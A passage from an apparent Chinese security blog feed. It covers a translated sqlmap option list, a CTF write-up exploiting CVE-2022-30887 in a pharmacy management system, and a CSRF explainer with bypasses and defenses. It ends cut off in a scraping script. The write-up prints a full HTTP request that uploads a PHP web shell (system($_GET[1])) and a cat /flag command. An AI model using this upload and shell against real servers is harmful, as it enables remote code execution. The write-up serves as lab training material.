预测常用请求的输出</span><br>    <span class="hljs-comment">--keep-alive        使用持久的 HTTP(S) 连接</span><br>    <span class="hljs-comment">--null-connection   仅获取页面大小而非实际的 HTTP 响应</span><br>    <span class="hljs-comment">--threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）</span><br><br>  注入：<br>    以下选项用于指定要测试的参数，<br>    提供自定义注入 payloads 和篡改参数的脚本<br><br>    <span class="hljs-operator">-</span>p TESTPARAMETER    指定需要测试的参数<br>    <span class="hljs-comment">--skip=SKIP         指定要跳过的参数</span><br>    <span class="hljs-comment">--skip-static       指定跳过非动态参数</span><br>    <span class="hljs-comment">--param-exclude=..  用正则表达式排除参数（例如：&quot;ses&quot;）</span><br>    <span class="hljs-comment">--param-filter=P..  通过位置过滤可测试参数（例如：&quot;POST&quot;）</span><br>    <span class="hljs-comment">--dbms=DBMS         指定后端 DBMS（Database Management System，</span><br>                        数据库管理系统）类型（例如：MySQL）<br>    <span class="hljs-comment">--dbms-cred=DBMS..  DBMS 认证凭据（username:password）</span><br>    <span class="hljs-comment">--os=OS             指定后端 DBMS 的操作系统类型</span><br>    <span class="hljs-comment">--invalid-bignum    将无效值设置为大数</span><br>    <span class="hljs-comment">--invalid-logical   对无效值使用逻辑运算</span><br>    <span class="hljs-comment">--invalid-string    对无效值使用随机字符串</span><br>    <span class="hljs-comment">--no-cast           关闭 payload 构造机制</span><br>    <span class="hljs-comment">--no-escape         关闭字符串转义机制</span><br>    <span class="hljs-comment">--prefix=PREFIX     注入 payload 的前缀字符串</span><br>    <span class="hljs-comment">--suffix=SUFFIX     注入 payload 的后缀字符串</span><br>    <span class="hljs-comment">--tamper=TAMPER     用给定脚本修改注入数据</span><br><br>  检测：<br>    以下选项用于自定义检测方式<br><br>    <span class="hljs-comment">--level=LEVEL       设置测试等级（1-5，默认为 1）</span><br>    <span class="hljs-comment">--risk=RISK         设置测试风险等级（1-3，默认为 1）</span><br>    <span class="hljs-comment">--string=STRING     用于确定查询结果为真时的字符串</span><br>    <span class="hljs-comment">--not-string=NOT..  用于确定查询结果为假时的字符串</span><br>    <span class="hljs-comment">--regexp=REGEXP     用于确定查询结果为真时的正则表达式</span><br>    <span class="hljs-comment">--code=CODE         用于确定查询结果为真时的 HTTP 状态码</span><br>    <span class="hljs-comment">--smart             只在使用启发式检测时才进行彻底的测试</span><br>    <span class="hljs-comment">--text-only         只根据页面文本内容对比页面</span><br>    <span class="hljs-comment">--titles            只根据页面标题对比页面</span><br><br>  技术：<br>    以下选项用于调整特定 <span class="hljs-keyword">SQL</span> 注入技术的测试方法<br><br>    <span class="hljs-comment">--technique=TECH..  使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：</span><br>                        B: <span class="hljs-type">Boolean</span><span class="hljs-operator">-</span>based blind <span class="hljs-keyword">SQL</span> injection（布尔型盲注）<br>                        E: Error<span class="hljs-operator">-</span>based <span class="hljs-keyword">SQL</span> injection（报错型注入）<br>                        U: <span class="hljs-keyword">UNION</span> query <span class="hljs-keyword">SQL</span> injection（联合查询注入）<br>                        S: Stacked queries <span class="hljs-keyword">SQL</span> injection（堆叠查询注入）<br>                        T: <span class="hljs-type">Time</span><span class="hljs-operator">-</span>based blind <span class="hljs-keyword">SQL</span> injection（时间型盲注）<br>                        Q: inline Query injection（内联查询注入）<br>    <span class="hljs-comment">--time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）</span><br>    <span class="hljs-comment">--union-cols=UCOLS  设置联合查询注入测试的列数目范围</span><br>    <span class="hljs-comment">--union-char=UCHAR  用于暴力猜解列数的字符</span><br>    <span class="hljs-comment">--union-from=UFROM  设置联合查询注入 FROM 处用到的表</span><br>    <span class="hljs-comment">--dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：</span><br>                        推荐阅读《在<span class="hljs-keyword">SQL</span>注入中使用DNS获取数据》<br>                        http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>cb.drops.wiki<span class="hljs-operator">/</span>drops<span class="hljs-operator">/</span>tips<span class="hljs-number">-5283.</span>html，<br>                        在后面的“技术”小节中也有相应解释）<br>    <span class="hljs-comment">--second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：</span><br>                        该选项用于 <span class="hljs-keyword">SQL</span> 二阶注入）<br>    <span class="hljs-comment">--second-req=SEC..  从文件读取 HTTP 二阶请求</span><br><br>  指纹识别：<br>    <span class="hljs-operator">-</span>f, <span class="hljs-comment">--fingerprint   执行广泛的 DBMS 版本指纹识别</span><br><br>  枚举：<br>    以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据<br><br>    <span class="hljs-operator">-</span>a, <span class="hljs-comment">--all           获取所有信息、数据</span><br>    <span class="hljs-operator">-</span>b, <span class="hljs-comment">--banner        获取 DBMS banner</span><br>    <span class="hljs-comment">--current-user      获取 DBMS 当前用户</span><br>    <span class="hljs-comment">--current-db        获取 DBMS 当前数据库</span><br>    <span class="hljs-comment">--hostname          获取 DBMS 服务器的主机名</span><br>    <span class="hljs-comment">--is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）</span><br>    <span class="hljs-comment">--users             枚举出 DBMS 所有用户</span><br>    <span class="hljs-comment">--passwords         枚举出 DBMS 所有用户的密码哈希</span><br>    <span class="hljs-comment">--privileges        枚举出 DBMS 所有用户特权级</span><br>    <span class="hljs-comment">--roles             枚举出 DBMS 所有用户角色</span><br>    <span class="hljs-comment">--dbs               枚举出 DBMS 所有数据库</span><br>    <span class="hljs-comment">--tables            枚举出 DBMS 数据库中的所有表</span><br>    <span class="hljs-comment">--columns           枚举出 DBMS 表中的所有列</span><br>    <span class="hljs-comment">--schema            枚举出 DBMS 所有模式</span><br>    <span class="hljs-comment">--count             获取数据表数目</span><br>    <span class="hljs-comment">--dump              导出 DBMS 数据库表项</span><br>    <span class="hljs-comment">--dump-all          导出所有 DBMS 数据库表项</span><br>    <span class="hljs-comment">--search            搜索列，表和/或数据库名</span><br>    <span class="hljs-comment">--comments          枚举数据时检查 DBMS 注释</span><br>    <span class="hljs-comment">--statements        获取 DBMS 正在执行的 SQL 语句</span><br>    <span class="hljs-operator">-</span>D DB               指定要枚举的 DBMS 数据库<br>    <span class="hljs-operator">-</span>T TBL              指定要枚举的 DBMS 数据表<br>    <span class="hljs-operator">-</span>C COL              指定要枚举的 DBMS 数据列<br>    <span class="hljs-operator">-</span>X EXCLUDE          指定不枚举的 DBMS 标识符<br>    <span class="hljs-operator">-</span>U <span class="hljs-keyword">USER</span>             指定枚举的 DBMS 用户<br>    <span class="hljs-comment">--exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库</span><br>    <span class="hljs-comment">--pivot-column=P..  指定主列</span><br>    <span class="hljs-comment">--where=DUMPWHERE   在转储表时使用 WHERE 条件语句</span><br>    <span class="hljs-comment">--start=LIMITSTART  指定要导出的数据表条目开始行数</span><br>    <span class="hljs-comment">--stop=LIMITSTOP    指定要导出的数据表条目结束行数</span><br>    <span class="hljs-comment">--first=FIRSTCHAR   指定获取返回查询结果的开始字符位</span><br>    <span class="hljs-comment">--last=LASTCHAR     指定获取返回查询结果的结束字符位</span><br>    <span class="hljs-comment">--sql-query=SQLQ..  指定要执行的 SQL 语句</span><br>    <span class="hljs-comment">--sql-shell         调出交互式 SQL shell</span><br>    <span class="hljs-comment">--sql-file=SQLFILE  执行文件中的 SQL 语句</span><br><br>  暴力破解：<br>    以下选项用于暴力破解测试<br><br>    <span class="hljs-comment">--common-tables     检测常见的表名是否存在</span><br>    <span class="hljs-comment">--common-columns    检测常用的列名是否存在</span><br>    <span class="hljs-comment">--common-files      检测普通文件是否存在</span><br><br>  用户自定义函数注入：<br>    以下选项用于创建用户自定义函数<br><br>    <span class="hljs-comment">--udf-inject        注入用户自定义函数</span><br>    <span class="hljs-comment">--shared-lib=SHLIB  共享库的本地路径</span><br><br>  访问文件系统：<br>    以下选项用于访问后端 DBMS 的底层文件系统<br><br>    <span class="hljs-comment">--file-read=FILE..  读取后端 DBMS 文件系统中的文件</span><br>    <span class="hljs-comment">--file-write=FIL..  写入到后端 DBMS 文件系统中的文件</span><br>    <span class="hljs-comment">--file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件</span><br><br>  访问操作系统：<br>    以下选项用于访问后端 DBMS 的底层操作系统<br><br>    <span class="hljs-comment">--os-cmd=OSCMD      执行操作系统命令</span><br>    <span class="hljs-comment">--os-shell          调出交互式操作系统 shell</span><br>    <span class="hljs-comment">--os-pwn            调出 OOB shell，Meterpreter 或 VNC</span><br>    <span class="hljs-comment">--os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC</span><br>    <span class="hljs-comment">--os-bof            利用存储过程的缓冲区溢出</span><br>    <span class="hljs-comment">--priv-esc          数据库进程用户提权</span><br>    <span class="hljs-comment">--msf-path=MSFPATH  Metasploit 框架的本地安装路径</span><br>    <span class="hljs-comment">--tmp-path=TMPPATH  远程临时文件目录的绝对路径</span><br><br>  访问 Windows 注册表：<br>    以下选项用于访问后端 DBMS 的 Windows 注册表<br><br>    <span class="hljs-comment">--reg-read          读取一个 Windows 注册表键值</span><br>    <span class="hljs-comment">--reg-add           写入一个 Windows 注册表键值数据</span><br>    <span class="hljs-comment">--reg-del           删除一个 Windows 注册表键值</span><br>    <span class="hljs-comment">--reg-key=REGKEY    指定 Windows 注册表键</span><br>    <span class="hljs-comment">--reg-value=REGVAL  指定 Windows 注册表键值</span><br>    <span class="hljs-comment">--reg-data=REGDATA  指定 Windows 注册表键值数据</span><br>    <span class="hljs-comment">--reg-type=REGTYPE  指定 Windows 注册表键值类型</span><br><br>  通用选项：<br>    以下选项用于设置通用的参数<br><br>    <span class="hljs-operator">-</span>s SESSIONFILE      从文件（.sqlite）中读入会话信息<br>    <span class="hljs-operator">-</span>t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件<br>    <span class="hljs-comment">--answers=ANSWERS   预设回答（例如：&quot;quit=N,follow=N&quot;）</span><br>    <span class="hljs-comment">--base64=BASE64P..  表明参数包含 Base64 编码的数据</span><br>    <span class="hljs-comment">--base64-safe       使用 URL 与文件名安全的 Base64 字母表（RFC 4648）</span><br>    <span class="hljs-comment">--batch             从不询问用户输入，使用默认配置</span><br>    <span class="hljs-comment">--binary-fields=..  具有二进制值的结果字段（例如：&quot;digest&quot;）</span><br>    <span class="hljs-comment">--check-internet    在访问目标之前检查是否正常连接互联网</span><br>    <span class="hljs-comment">--cleanup           清理 DBMS 中特定的 sqlmap UDF 与数据表</span><br>    <span class="hljs-comment">--crawl=CRAWLDEPTH  从目标 URL 开始爬取网站</span><br>    <span class="hljs-comment">--crawl-exclude=..  用正则表达式筛选爬取的页面（例如：&quot;logout&quot;）</span><br>    <span class="hljs-comment">--csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）</span><br>    <span class="hljs-comment">--charset=CHARSET   指定 SQL 盲注字符集（例如：&quot;0123456789abcdef&quot;）</span><br>    <span class="hljs-comment">--dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）</span><br>    <span class="hljs-comment">--encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）</span><br>    <span class="hljs-comment">--eta               显示每个结果输出的预计到达时间</span><br>    <span class="hljs-comment">--flush-session     清空当前目标的会话文件</span><br>    <span class="hljs-comment">--forms             解析并测试目标 URL 的表单</span><br>    <span class="hljs-comment">--fresh-queries     忽略存储在会话文件中的查询结果</span><br>    <span class="hljs-comment">--gpage=GOOGLEPAGE  指定所用 Google dork 结果的页码</span><br>    <span class="hljs-comment">--har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中</span><br>    <span class="hljs-comment">--hex               获取数据时使用 hex 转换</span><br>    <span class="hljs-comment">--output-dir=OUT..  自定义输出目录路径</span><br>    <span class="hljs-comment">--parse-errors      从响应中解析并显示 DBMS 错误信息</span><br>    <span class="hljs-comment">--preprocess=PRE..  使用给定脚本做前处理（请求）</span><br>    <span class="hljs-comment">--postprocess=PO..  使用给定脚本做后处理（响应）</span><br>    <span class="hljs-comment">--repair            重新导出具有未知字符的数据（?）</span><br>    <span class="hljs-comment">--save=SAVECONFIG   将选项设置保存到一个 INI 配置文件</span><br>    <span class="hljs-comment">--scope=SCOPE       用正则表达式过滤目标</span><br>    <span class="hljs-comment">--skip-heuristics   不对 SQLi/XSS 漏洞进行启发式检测</span><br>    <span class="hljs-comment">--skip-waf          不对 WAF/IPS 进行启发式检测</span><br>    <span class="hljs-comment">--table-prefix=T..  指定临时数据表名前（默认：&quot;sqlmap&quot;）</span><br>    <span class="hljs-comment">--test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试</span><br>    <span class="hljs-comment">--test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试</span><br>    <span class="hljs-comment">--web-root=WEBROOT  指定 Web 服务器根目录（例如：&quot;/var/www&quot;）</span><br>    <br><br>  杂项：<br>    以下选项不属于前文的任何类别<br><br>    <span class="hljs-operator">-</span>z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec<span class="hljs-operator">=</span>EU”）<br>    <span class="hljs-comment">--alert=ALERT       在找到 SQL 注入时运行 OS 命令</span><br>    <span class="hljs-comment">--beep              在问题提示或在发现 SQL 注入/XSS/FI 时发出提示音</span><br>    <span class="hljs-comment">--dependencies      检查 sqlmap 缺少（可选）的依赖</span><br>    <span class="hljs-comment">--disable-coloring  关闭彩色控制台输出</span><br>    <span class="hljs-comment">--offline           在离线模式下工作（仅使用会话数据）</span><br>    <span class="hljs-comment">--purge             安全删除 sqlmap data 目录所有内容</span><br>    <span class="hljs-comment">--results-file=R..  指定多目标模式下的 CSV 结果输出路径</span><br>    <span class="hljs-comment">--shell             调出交互式 sqlmap shell</span><br>    <span class="hljs-comment">--tmp-dir=TMPDIR    指定用于存储临时文件的本地目录</span><br>    <span class="hljs-comment">--unstable          为不稳定连接调整选项</span><br>    <span class="hljs-comment">--update            更新 sqlmap</span><br>    <span class="hljs-comment">--wizard            适合初级用户的向导界面</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云境---CVE-2022-30887</title>
    <link href="/2022/03/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83---CVE-2022-30887/"/>
    <url>/2022/03/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83---CVE-2022-30887/</url>
    
    <content type="html"><![CDATA[<h3 id="CVE-2022-30887"><a href="#CVE-2022-30887" class="headerlink" title="CVE-2022-30887"></a>CVE-2022-30887</h3><h4 id="一、步骤"><a href="#一、步骤" class="headerlink" title="一、步骤"></a>一、步骤</h4><p>首先打开环境，进入到页面发现是一个登录框，需要用户名和密码，但是无论从当前页面和题目相关信息中并未获取到用登录名和密码，唯一有一点关联的是页面所给漏洞编号以及页面下方。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301271116359.png" alt="image-20230127111625079"></p><p>所以我的思路先从这个漏洞编号上下手，在国家漏洞平台上查找后得到以下内容，简而言之就是CVE-2022-30887可以在某个页面内上传木马文件。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301271129054.png" alt="image-20230127112920106"></p><p>找到漏洞信息，下一步就是如何进入它这个系统，此时登录页面最下面的“Mayuri K”发现是可以点击的，所以就点进去访问，结合漏洞报告中对该漏洞的描述，发现有关键字“Pharmacy”，所以尝试点击访问</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301271137557.png" alt="image-20230127113713060"></p><p>根据网站页面猜测这应该是一个管理系统，所以在当前页面下看看能不能获取到这个管理系统的源代码。这里我的想法是假如有源代码那就查看源代码中有是否有关于邮箱和密码，一般这种个人写的系统大概率会有存放邮箱地址让使用者可以及时联系开发者，所以如果能找到邮箱地址，在没有密码的前提下可以尝试弱口令。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301271139914.png" alt="image-20230127113943428"></p><p>有了上述思路后，尝试在页面中看看有没有可以下载的源代码的地方。发现这里可以下载</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301271147507.png" alt="image-20230127114743805"></p><p>点击后会让你输入自己的邮箱和一些别的信息，我选择使用自己虚拟邮箱，其他的信息就胡乱填写。此时查看我的邮箱发现开发将源代码放入谷歌云盘上之后将压缩包发到邮箱上。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281143446.png" alt="image-20230127115030179"></p><p>点击下载，后将源代码下载，里面有一个txt文件打开文件直接拿到邮箱和密码</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281143331.png" alt="image-20230127115114122"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281143604.png" alt="image-20230127115200129"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281143103.png" alt="image-20230127115303596"></p><p>进入界面结合前面分析，在里面找有文件上传的地方，上传一个一句话木马文件，系统当中有两处文件上传，这两处文件上传功能我是随机挑了一个测试，里面参数随便填然后提交。在页面当中找到刚刚上传的文件，访问该图片的链接。</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301271726716.png" alt="image-20230127172600532"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281143340.png" alt="image-20230127172806983"></p><p>到了这里我尝试用蚁剑进行连接，发现也能连接上但是找不到flag在哪，所以没得办法就使用Burp利用漏洞平台构造的数据包进行访问，上传成功后访问shell并获取flag：<code>http://eci-2ze7ntvll5ye8fxnoc64.cloudeci1.ichunqiu.com/assets/myimages/test.php?1=cat%20/flag</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/php_action/editProductImage.php?id=1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>eci-2ze7ntvll5ye8fxnoc64.cloudeci1.ichunqiu.com<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=---------------------------208935235035266125502673738631<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>479<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=d2hvmuiicg9o9jl78hc2mkneel<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-php">-----------------------------<span class="hljs-number">208935235035266125502673738631</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;old_image&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">-----------------------------<span class="hljs-number">208935235035266125502673738631</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;productImage&quot;</span>; filename=<span class="hljs-string">&quot;test.php&quot;</span></span><br><span class="language-php">Content-Type: image/jpeg</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br><span class="language-php">-----------------------------<span class="hljs-number">208935235035266125502673738631</span></span><br><span class="language-php">Content-Disposition: form-data; name=<span class="hljs-string">&quot;btn&quot;</span></span><br><span class="language-php"></span><br><span class="language-php"></span><br><span class="language-php">-----------------------------<span class="hljs-number">208935235035266125502673738631</span>--</span><br><span class="language-php"></span><br></code></pre></td></tr></table></figure><h4 id="二、总结"><a href="#二、总结" class="headerlink" title="二、总结"></a>二、总结</h4><p>这个靶场的综合运用还是有一点点强，因为这是一个靶场，所以上面有漏洞编号，此次能如此顺利是因为先根据漏洞编号去找这个漏洞的信息。但是假如没有这个漏洞编号？</p><p>大致思路：假如没有漏洞编号，只有一个链接的情况下，先访问这个链接，在链接页面中找到有关信息，该网站的有一个好处就是它在页面下方提供了源码下载的地方，通过访问这个系统的官网，发现里面有很多下载源码的地方，找到需要下载的源码，然后看看源码里面能找到什么相关信息能帮助登录上去，找到之后对里面功能点一个个测试。</p><h4 id="3、参考资料链接和存在漏洞源码"><a href="#3、参考资料链接和存在漏洞源码" class="headerlink" title="3、参考资料链接和存在漏洞源码"></a>3、参考资料链接和存在漏洞源码</h4><ul><li><p><a href="https://packetstormsecurity.com/files/166786/Pharmacy-Management-System-1.0-Shell-Upload.html">https://packetstormsecurity.com/files/166786/Pharmacy-Management-System-1.0-Shell-Upload.html</a></p></li><li><p><a href="https://blog.csdn.net/weixin_44030810/article/details/127392107">https://blog.csdn.net/weixin_44030810/article/details/127392107</a></p></li><li><pre><code class="language-PHP">&lt;?phprequire_once &#39;core.php&#39;;//$valid[&#39;success&#39;] = array(&#39;success&#39; =&gt; false, &#39;messages&#39; =&gt; array());$productId = $_GET[&#39;id&#39;];if ($_POST) &#123;    $image = $_FILES[&#39;productImage&#39;][&#39;name&#39;];    $target = &quot;../assets/myimages/&quot; . basename($image);    if (move_uploaded_file($_FILES[&#39;productImage&#39;][&#39;tmp_name&#39;], $target)) &#123;        // @unlink(&quot;uploadImage/Profile/&quot;.$_POST[&#39;old_image&#39;]);        //echo $_FILES[&#39;image&#39;][&#39;tmp_name&#39;];        //cho $target;exit;        $msg = &quot;Image uploaded successfully&quot;;        echo $msg;    &#125; else &#123;        $msg = &quot;Failed to upload image&quot;;        echo $msg;        exit;    &#125;    $sql = &quot;UPDATE product SET product_image = &#39;$image&#39; WHERE product_id = $productId&quot;;//echo $sql;exit;    if ($connect-&gt;query($sql) === TRUE) &#123;        $valid[&#39;success&#39;] = true;        $valid[&#39;messages&#39;] = &quot;Successfully Updated&quot;;        header(&#39;location:../product.php&#39;);    &#125; else &#123;        $valid[&#39;success&#39;] = false;        $valid[&#39;messages&#39;] = &quot;Error while updating product image&quot;;    &#125;    // /else    $connect-&gt;close();    echo json_encode($valid);&#125; // /if $_POST?&gt;</code></pre></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>远程文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞原理---CSRF漏洞</title>
    <link href="/2022/03/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---CSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/03/14/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86---CSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h3><h4 id="1、漏洞原理"><a href="#1、漏洞原理" class="headerlink" title="1、漏洞原理"></a>1、漏洞原理</h4><p>&ensp;&ensp;CSRF简称为跨站请求攻击，是攻击者通过一些技术手段欺骗用户的浏览器去访问自己曾经认证过的网站并执行一些操作(如：发邮件，发消息，转账，购买商品)。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份认证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p>&ensp;&ensp;换言之跨站请求攻击发生点在攻击者这里，攻击者首先构造一个带有攻击代码链接，将这个链接伪装好分享给受害者，受害者在点开这个链接之后，浏览器就会将受害者的cookie信息与攻击代码一起发送给服务器，此时服务器会认为这是来自受害者的攻击。在这个过程中攻击者只知道受害者将这个链接点了还是没点，关于受害者的信息攻击者一无所知。</p><h4 id="2、漏洞利用条件"><a href="#2、漏洞利用条件" class="headerlink" title="2、漏洞利用条件"></a>2、漏洞利用条件</h4><ul><li>1.被害用户已经完成身份认证</li><li>2.新请求的提交不需要重新身份认证或确认机制</li><li>3.攻击者必须了解Web APP请求的参数构造</li><li>4.引诱用户触发攻击的指令（社工）</li></ul><h3 id="3、防御绕过"><a href="#3、防御绕过" class="headerlink" title="3、防御绕过"></a>3、防御绕过</h3><ul><li>删除CSRFTOKEN</li><li>将POST改为GET</li><li>CSRFTOKEN未和身份凭证绑定</li></ul><h4 id="4、加固"><a href="#4、加固" class="headerlink" title="4、加固"></a>4、加固</h4><ul><li><p>二次密码验证</p></li><li><p>Referer来源验证</p></li><li><ul><li>Referer：获取的是上一条历史记录的url</li></ul></li><li><p>添加CSRFTOKEN</p></li><li><ul><li>用户每次访问关键页面时，服务端通过cookie下发一个暗号“-csrftoken”是一个随机生成的字符串</li></ul></li><li><p>限制cookie同源</p></li><li><p>在HTTP头中自定义属性并验证。</p></li></ul><h4 id="5、测试功能点"><a href="#5、测试功能点" class="headerlink" title="5、测试功能点"></a>5、测试功能点</h4><ul><li>密码修改</li><li>点赞</li><li>转账</li><li>注销</li><li>删除</li></ul><h4 id><a href="#" class="headerlink" title></a></h4><p> </p>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞</tag>
      
      <tag>CSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---爬取练习</title>
    <link href="/2020/10/21/python---%E7%88%AC%E5%8F%96%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/10/21/python---%E7%88%AC%E5%8F%96%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"># -*- coding: utf-8 -*-</span><br><span class="hljs-string"># @Time    : 2022/10/29 23:49</span><br><span class="hljs-string"># @Author  : ReadPond</span><br><span class="hljs-string"># @Comment : 爬取豆瓣电影详情----&gt;批量爬取</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>head = &#123;        <span class="hljs-comment"># 设定一个头部信息</span><br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.24&quot;</span><br>&#125;<br><br>url = <span class="hljs-string">&quot;https://movie.douban.com/j/chart/top_list&quot;</span>   <span class="hljs-comment"># 根据抓包工具分析我们爬取内容的地址</span><br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">通过抓包工具分析得知，当前网站的电影排行榜中的内容为动态数据，且url地址也不是正常官网地址，</span><br><span class="hljs-string">电影名称和评分等信息没有存放在主体页面中，而是通过json请求到后端数据库中，所以我们这里需要根据当前网站定义</span><br><span class="hljs-string">传入的数据（每个网站的数据方式不同，这里需要具体网站具体分析）</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>param = &#123;<br>    <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;12&quot;</span>,       <span class="hljs-comment"># 表示电影类型，该网站电影类型数为31个</span><br>    <span 